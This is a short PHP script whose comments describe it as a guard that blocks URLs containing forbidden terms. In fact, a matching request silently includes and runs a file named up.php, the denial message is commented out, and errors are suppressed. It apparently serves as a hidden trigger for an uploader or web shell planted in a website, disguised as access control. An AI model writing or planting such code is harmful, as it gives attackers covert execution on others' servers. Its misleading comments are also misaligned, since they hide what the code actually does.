<?php
/**
 * Controle de execução: Bloqueia se a URL contiver palavras do JSON
 */

@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);

// ==========================
// CONFIGURAÇÃO (JSON)
// ==========================
$jsonProibidos = '[".com/index.php", ".com/index.html", "/database.php","/EDITOR_FILES_LOCAL.php","up.html"]';
$listaProibida = json_decode($jsonProibidos, true);

// ==========================
// CAPTURA A URL ATUAL
// ==========================
// Pega tudo que vem depois do domínio (ex: /pasta/index.php?id=teste)
$urlCompleta = $_SERVER['REQUEST_URI'];

// ==========================
// VERIFICAÇÃO DE BLOQUEIO
// ==========================
$bloqueado = false;

foreach ($listaProibida as $termo) {
    // Verifica se o termo do JSON existe dentro da URL
    if (!empty($termo) && strpos($urlCompleta, $termo) !== false) {
        $bloqueado = true;
        $termoEncontrado = $termo;
        break;
    }
}

if ($bloqueado) {

// ==========================
// EXECUTA PROCESSO
// =========================

if (file_exists("up.php")) {
    include_once "up.php";
} else {
    echo "Erro: up.php não encontrado.";
}

    // header("Content-Type: text/html; charset=utf-8");
    // exit("⚠️ **ACESSO NEGADO**: A URL contém um termo restrito ($termoEncontrado).");
}

?>
